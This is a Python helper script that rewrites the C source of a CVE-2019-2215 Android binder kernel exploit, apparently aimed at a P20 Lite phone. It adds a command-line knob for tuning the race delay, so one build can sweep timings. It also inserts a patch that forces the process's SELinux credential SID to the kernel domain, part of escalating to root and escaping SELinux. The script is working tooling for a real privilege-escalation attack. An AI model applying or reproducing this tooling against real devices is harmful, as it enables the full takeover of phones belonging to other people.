#!/usr/bin/env python3
"""Make the exploit source buildable with both patches, idempotently.

Two things have to hold at once:
  1. g_delay must be DECLARED before its first use (the usleep sites are in
     functions above main), so it lives at the top of the file.
  2. The SELinux cred-SID patch must be present.

Run this before every build. It is idempotent and reports what it did.
"""
import re
import sys

SRC = "/home/placeless/dev/p20lite-cve/exploit/cve_2019_2215.c"
HDR = "/home/placeless/dev/p20lite-cve/exploit/include/kernel_specific.h"

src = open(SRC).read()
actions = []

# --- 1. g_delay declaration at the top, exactly once -------------------------
decl = ("// Race delay. Defaults to the compiled-in DELAY; main() can override it from\n"
        "// argv so one build can sweep the value without rebuilding (each rebuild shifts\n"
        "// the compiled layout and with it the effective race window).\n"
        "unsigned int g_delay = DELAY;")

# remove every existing declaration
src2 = re.sub(r"(?m)^(//[^\n]*\n)*^unsigned int g_delay = DELAY;\n", "", src)
if src2 != src:
    actions.append("removed existing g_delay declaration(s)")
src = src2

# insert right after the leading include
anchor = '#include "include/cve_2019_2215.h"\n'
if anchor not in src:
    print("FATAL: include anchor not found")
    sys.exit(1)
src = src.replace(anchor, anchor + "\n" + decl + "\n", 1)
actions.append("inserted g_delay after the include")

# --- 2. usleep sites use g_delay ---------------------------------------------
n = src.count("usleep(DELAY)")
src = src.replace("usleep(DELAY)", "usleep(g_delay)")
if n:
    actions.append(f"rewrote {n} usleep site(s)")

# --- 3. main takes argv -------------------------------------------------------
if "int main(int argc, char *argv[])" not in src:
    src = src.replace("int main() {", "int main(int argc, char *argv[]) {", 1)
    actions.append("main() now takes argv")

# make sure the argv handling exists
if "g_delay = d;" not in src:
    src = src.replace(
        "int main(int argc, char *argv[]) {\n",
        "int main(int argc, char *argv[]) {\n"
        "    if (argc > 1) {\n"
        "        unsigned int d = (unsigned int) strtoul(argv[1], NULL, 0);\n"
        "        if (d > 0) g_delay = d;\n"
        "        printf(\"[>] DELAY overridden to %u us\\n\", g_delay);\n"
        "    }\n", 1)
    actions.append("added argv parsing")

# --- 4. the SELinux cred-SID patch -------------------------------------------
if "set_sid(cred_addr, KERNEL_DOMAIN_SID)" not in src:
    src = src.replace(
        '    printf("[+] SID=%u\\n", sid);\n',
        '    printf("[+] SID=%u\\n", sid);\n'
        '    set_sid(cred_addr, KERNEL_DOMAIN_SID);\n'
        '    printf("[+] SID forced to %lu (kernel domain)\\n", (unsigned long) KERNEL_DOMAIN_SID);\n',
        1)
    actions.append("re-added the cred-SID patch")

open(SRC, "w").write(src)

hdr = open(HDR).read()
if "KERNEL_DOMAIN_SID" not in hdr:
    hdr = hdr.replace("#define SELINUX_ENFORCING_OFFSET",
                      "#define KERNEL_DOMAIN_SID 1ul\n#define SELINUX_ENFORCING_OFFSET", 1)
    open(HDR, "w").write(hdr)
    actions.append("added KERNEL_DOMAIN_SID")

# --- verify -------------------------------------------------------------------
src = open(SRC).read()
pos_decl = src.find("unsigned int g_delay = DELAY;")
pos_first_use = src.find("usleep(g_delay)")
ok = (pos_decl != -1 and pos_first_use != -1 and pos_decl < pos_first_use
      and "set_sid(cred_addr, KERNEL_DOMAIN_SID)" in src)

print("actions: " + ("; ".join(actions) if actions else "none (already correct)"))
print(f"decl line {src[:pos_decl].count(chr(10))+1 if pos_decl>=0 else -1}, "
      f"first use line {src[:pos_first_use].count(chr(10))+1 if pos_first_use>=0 else -1}")
print("declaration precedes first use:", ok)
sys.exit(0 if ok else 1)
